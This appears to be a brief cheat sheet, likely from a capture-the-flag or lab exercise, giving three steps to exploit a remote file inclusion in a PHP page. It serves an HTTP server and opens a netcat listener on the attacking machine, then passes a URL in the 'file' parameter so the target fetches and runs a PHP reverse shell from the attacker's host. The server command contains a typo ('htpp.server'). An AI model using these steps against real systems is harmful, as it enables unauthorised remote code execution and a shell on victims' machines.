# First Step

Open http server on attacking machine

python3 -m htpp.server [PORT]

# Second Step

Create listener on attacking machine

nc -lvnp 1234

# Third Step

On target in the URL field

http://10.10.10.10/index.php?file=http://[attacker machine IP]:[PORT]/php-reverse-shell.php
